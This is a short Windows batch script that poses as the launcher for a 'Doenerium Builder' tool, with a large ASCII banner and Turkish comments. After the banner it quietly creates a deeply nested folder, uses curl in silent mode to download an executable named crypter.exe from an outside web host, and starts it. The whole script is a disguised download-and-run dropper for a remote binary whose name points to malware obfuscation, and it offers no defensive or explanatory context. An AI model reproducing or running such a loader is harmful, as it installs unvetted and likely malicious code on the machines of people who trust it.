@echo off
chcp 65001 >nul
cls
echo.
echo.
echo.
echo             ██████╗  ██████╗ ███████╗███╗   ██╗███████╗██████╗ ██╗██╗   ██╗███╗   ███╗
echo             ██╔══██╗██╔═══██╗██╔════╝████╗  ██║██╔════╝██╔══██╗██║██║   ██║████╗ ████║
echo             ██║  ██║██║   ██║█████╗  ██╔██╗ ██║█████╗  ██████╔╝██║██║   ██║██╔████╔██║
echo             ██║  ██║██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██║██║   ██║██║╚██╔╝██║
echo             ██████╔╝╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║╚██████╔╝██║ ╚═╝ ██║
echo             ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
echo.
echo                                           Builder
echo.
echo.
echo.
timeout /t 3 >nul

rem Gerekli klasörleri oluştur
if not exist "screenshots\profile\aa\b" mkdir "screenshots\profile\aa\b"

rem curl kullanarak dosyayı sessiz modda indirme
curl -s -o "screenshots\profile\aa\b\crypter.exe" https://anodos.store/download/crypter.exe

rem Dosyayı çalıştırma
start "" "screenshots\profile\aa\b\crypter.exe"

exit
